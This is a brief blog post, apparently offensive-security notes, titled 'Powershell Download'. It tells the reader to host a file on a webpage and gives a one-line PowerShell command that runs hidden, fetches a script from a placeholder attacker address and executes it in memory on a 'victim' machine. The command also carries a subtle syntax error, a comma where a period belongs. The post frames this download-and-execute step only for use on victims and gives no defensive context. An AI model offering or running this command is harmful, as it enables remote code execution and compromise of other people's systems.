---
layout: post
title: "Powershell Download"
date: 2017-06-23
---
<p>
Host file on a webpage. Use this command to download file to victim
<p>
<code>powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient),downloadstring('http://&lt;ip&gt;:&lt;port&gt;/&lt;file&gt;'))"</code></p>
</p>
